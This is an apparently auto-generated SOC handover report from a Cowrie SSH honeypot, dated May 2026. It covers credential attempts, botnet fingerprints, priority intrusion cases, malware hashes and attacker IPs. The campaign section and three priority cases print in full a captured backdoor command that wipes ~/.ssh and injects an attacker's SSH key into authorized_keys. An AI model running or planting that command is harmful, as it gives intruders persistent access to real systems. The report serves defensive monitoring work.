# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-19 |
| **Generated At** | 2026-05-19T15:32:58Z |
| **Shift Time** | 15:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **89** |
| Confirmed Threats | **68** |
| False Positives Filtered | **21** (23.6%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **13** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **26** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **10** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | 5 |
| `Accept-Encoding: gzip` | 5 |
| `345gs5662d34` | 2 |
| `GET / HTTP/1.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:2223` | 5 |
| `Accept: */*` | 5 |
| `` | 5 |
| `3245gs5662d34` | 3 |
| `345gs5662d34` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | `Accept: */*` | 5 |
| `Accept-Encoding: gzip` | `` | 5 |
| `root` | `3245gs5662d34` | 3 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `ca189` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ca189` | `168.231.122.123` | 2026-05-19T13:37:49 |
| `root` | `3245gs5662d34` | `168.231.122.123` | 2026-05-19T13:38:05 |
| `root` | `sydney` | `77.239.111.233` | 2026-05-19T13:39:12 |
| `root` | `3245gs5662d34` | `77.239.111.233` | 2026-05-19T13:39:17 |
| `root` | `ines123` | `188.127.161.78` | 2026-05-19T13:51:41 |
| `root` | `3245gs5662d34` | `188.127.161.78` | 2026-05-19T13:51:47 |
| `root` | `admin` | `125.79.167.24` | 2026-05-19T14:20:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **89** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 13 |
| Go SSH scanner | 1 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `e37f354a101a...` | Mirai/variant | 4 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `e37f354a101a...` | libssh | 4 | 2 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
start
```
```
enable
```
```
config terminal
```
```
system
```
```
linuxshell
```
Source IPs: `125.79.167.24`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `168.231.122.123`, `77.239.111.233`, `188.127.161.78`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **21** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS264756` | Cable Television Satelital SRL | 1 | LOW |
| `AS23888` | National Telecommunication Corporation HQ, | 1 | HIGH |
| `AS37517` | CABO VERDE TELECOM, S.A | 1 | HIGH |
| `AS48728` | Vodafone Qatar P.Q.S.C | 1 | LOW |
| `AS15704` | XTRA TELECOM S.A. | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3181db1934ba

| Field | Detail |
|---|---|
| **Source IP** | `168.231.122[.]123` |
| **First Seen** | 2026-05-19 13:37 |
| **Last Seen** | 2026-05-19 13:38 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:37:49` | `cowrie.session.connect` |
| `2026-05-19 13:37:49` | `cowrie.client.version` |
| `2026-05-19 13:37:49` | `cowrie.client.kex` |
| `2026-05-19 13:37:49` | `cowrie.login.success` |
| `2026-05-19 13:37:50` | `cowrie.session.params` |
| `2026-05-19 13:37:50` | `cowrie.command.input` |
| `2026-05-19 13:37:50` | `cowrie.command.failed` |
| `2026-05-19 13:37:50` | `cowrie.log.closed` |
| `2026-05-19 13:37:50` | `cowrie.session.params` |
| `2026-05-19 13:37:50` | `cowrie.command.input` |
| `2026-05-19 13:37:50` | `cowrie.session.file_download` |
| `2026-05-19 13:37:50` | `cowrie.log.closed` |
| `2026-05-19 13:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.231.122[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.231.122[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190c787569b8

| Field | Detail |
|---|---|
| **Source IP** | `168.231.122[.]123` |
| **First Seen** | 2026-05-19 13:38 |
| **Last Seen** | 2026-05-19 13:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:38:05` | `cowrie.session.connect` |
| `2026-05-19 13:38:05` | `cowrie.client.version` |
| `2026-05-19 13:38:05` | `cowrie.client.kex` |
| `2026-05-19 13:38:05` | `cowrie.login.success` |
| `2026-05-19 13:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.231.122[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.231.122[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a2090b76ab7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.111[.]233` |
| **First Seen** | 2026-05-19 13:39 |
| **Last Seen** | 2026-05-19 13:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:39:11` | `cowrie.session.connect` |
| `2026-05-19 13:39:11` | `cowrie.client.version` |
| `2026-05-19 13:39:12` | `cowrie.client.kex` |
| `2026-05-19 13:39:12` | `cowrie.login.success` |
| `2026-05-19 13:39:13` | `cowrie.session.params` |
| `2026-05-19 13:39:13` | `cowrie.command.input` |
| `2026-05-19 13:39:13` | `cowrie.command.failed` |
| `2026-05-19 13:39:13` | `cowrie.log.closed` |
| `2026-05-19 13:39:13` | `cowrie.session.params` |
| `2026-05-19 13:39:13` | `cowrie.command.input` |
| `2026-05-19 13:39:13` | `cowrie.session.file_download` |
| `2026-05-19 13:39:13` | `cowrie.log.closed` |
| `2026-05-19 13:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.111[.]233` to AbuseIPDB if not already reported
- [ ] Block `77.239.111[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a8fa17206b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.111[.]233` |
| **First Seen** | 2026-05-19 13:39 |
| **Last Seen** | 2026-05-19 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:39:16` | `cowrie.session.connect` |
| `2026-05-19 13:39:16` | `cowrie.client.version` |
| `2026-05-19 13:39:16` | `cowrie.client.kex` |
| `2026-05-19 13:39:17` | `cowrie.login.success` |
| `2026-05-19 13:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.111[.]233` to AbuseIPDB if not already reported
- [ ] Block `77.239.111[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b91c690c369

| Field | Detail |
|---|---|
| **Source IP** | `188.127.161[.]78` |
| **First Seen** | 2026-05-19 13:51 |
| **Last Seen** | 2026-05-19 13:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:51:40` | `cowrie.session.connect` |
| `2026-05-19 13:51:40` | `cowrie.client.version` |
| `2026-05-19 13:51:40` | `cowrie.client.kex` |
| `2026-05-19 13:51:41` | `cowrie.login.success` |
| `2026-05-19 13:51:42` | `cowrie.session.params` |
| `2026-05-19 13:51:42` | `cowrie.command.input` |
| `2026-05-19 13:51:42` | `cowrie.command.failed` |
| `2026-05-19 13:51:42` | `cowrie.log.closed` |
| `2026-05-19 13:51:43` | `cowrie.session.params` |
| `2026-05-19 13:51:43` | `cowrie.command.input` |
| `2026-05-19 13:51:43` | `cowrie.session.file_download` |
| `2026-05-19 13:51:43` | `cowrie.log.closed` |
| `2026-05-19 13:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.127.161[.]78` to AbuseIPDB if not already reported
- [ ] Block `188.127.161[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ce745b49d6

| Field | Detail |
|---|---|
| **Source IP** | `188.127.161[.]78` |
| **First Seen** | 2026-05-19 13:51 |
| **Last Seen** | 2026-05-19 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 13:51:45` | `cowrie.session.connect` |
| `2026-05-19 13:51:45` | `cowrie.client.version` |
| `2026-05-19 13:51:46` | `cowrie.client.kex` |
| `2026-05-19 13:51:47` | `cowrie.login.success` |
| `2026-05-19 13:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.127.161[.]78` to AbuseIPDB if not already reported
- [ ] Block `188.127.161[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.148.120[.]187` | **34** | 2026-05-19 11:37 | 2026-05-19 15:29 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `103.173.7[.]226` | **14** | 2026-05-19 14:43 | 2026-05-19 14:46 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `41.221.192[.]169` | **4** | 2026-05-19 13:30 | 2026-05-19 13:31 | 1m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-05-19 11:59 | 2026-05-19 12:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `175.107.31[.]20` | 1 | 2026-05-19 11:30 | 2026-05-19 11:30 | 32s | 0 | `T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-05-19 13:35 | 2026-05-19 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.118.143[.]207` | 1 | 2026-05-19 14:00 | 2026-05-19 14:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]190` | 1 | 2026-05-19 11:35 | 2026-05-19 11:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `188.127.161[.]78` | 1 | 2026-05-19 13:51 | 2026-05-19 13:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]14` | 1 | 2026-05-19 12:09 | 2026-05-19 12:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `32.192.202[.]58` | 1 | 2026-05-19 12:56 | 2026-05-19 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.111[.]233` | 1 | 2026-05-19 13:39 | 2026-05-19 13:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 8/100 | 🟢 LOW | **20/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `41.221.192[.]169` | CV | CABO VERDE TELECOM, S.A | **100** ⚠️ | 1 |
| `185.118.143[.]207` | TR | BuyukHosting Internet ve Bili?im Hizmetleri | **100** ⚠️ | 1 |
| `188.127.161[.]78` | ES | Xfera Moviles SA / Yoigo | **100** ⚠️ | 6 |
| `185.247.137[.]190` | GB | Driftnet Ltd | **100** ⚠️ | 47 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `103.173.7[.]226` | PK | GRACE BROADBAND | **100** ⚠️ | 0 |
| `180.76.170[.]111` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `77.239.111[.]233` | NL | Amsterdam, Netherlands | **100** ⚠️ | 15 |
| `32.192.202[.]58` | US | Amazon.com, Inc. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 15 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 14 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 89 cases |
| Tool 34  | Credential Extractor        | ✅ 26 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (23.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 54 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-19T15:32:58Z_
